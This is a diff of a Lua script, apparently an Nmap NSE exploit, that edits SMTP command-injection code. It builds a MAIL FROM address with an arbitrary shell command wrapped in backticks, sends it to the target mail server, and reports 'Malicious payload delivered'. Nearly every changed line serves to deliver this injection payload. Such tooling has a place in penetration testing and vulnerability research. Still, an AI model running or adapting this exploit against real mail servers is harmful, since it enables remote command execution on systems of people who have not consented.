@@ -31,7 +31,7 @@ action = function(host, port)
   
   local user = stdnse.get_script_args(SCRIPT_NAME..".user") or nil
   local pwd = stdnse.get_script_args(SCRIPT_NAME..".pwd") or nil
-  local from = stdnse.get_script_args(SCRIPT_NAME..".from") or "nmap@nmap.org"
+  local from = stdnse.get_script_args(SCRIPT_NAME..".from") or "nmap@"..smtp.get_domain(host)
   local to = stdnse.get_script_args(SCRIPT_NAME..".to") or "nmap@mailinator.com"
   local conn_timeout = stdnse.get_script_args(SCRIPT_NAME..".timeout") or 8000 
   local smtp_domain = stdnse.get_script_args(SCRIPT_NAME..".domain") or smtp.get_domain(host)
@@ -48,6 +48,7 @@ action = function(host, port)
   end
 
   if (user and pwd) then
+    status = false
     stdnse.print_debug(1, "%s:Mail server requires authentication.", SCRIPT_NAME)
     for i, mech in ipairs(auth_mech) do
       stdnse.print_debug(1, "Trying to authenticate using the method:%s", mech)
@@ -62,22 +63,28 @@ action = function(host, port)
     end
   end
 
-  local malicious_from_field = "nma`"..cmd.."`p@insecure.org"
- status, resp = smtp.mail(smtp_conn, malicious_from_field)
+  --Sends MAIL cmd and injects malicious payload
+  local from_frags = string.split(from, "@")
+  local malicious_from_field = from_frags[1].."`"..cmd.."`@"..from_frags[2]
+  status, resp = smtp.mail(smtp_conn, malicious_from_field)
   if not(status) then
     stdnse.print_debug(1, "%s:Payload failed:%s", SCRIPT_NAME, resp)
-    return "Failed"
+    return nil
   end
+
+  --Sets recipient
   status, resp = smtp.recipient(smtp_conn, to)
   if not(status) then
     stdnse.print_debug(1, "%s:Cannot set recipient:%s", SCRIPT_NAME, resp)
     return nil
   end
 
+  --Sets data and deliver email
   status, resp = smtp.datasend(smtp_conn, "nse")
   if status then
     return string.format("Malicious payload delivered:%s", resp)
   else
     stdnse.print_debug(1, "Payload could not be delivered:%s", resp) 
   end
+  return nil
  end
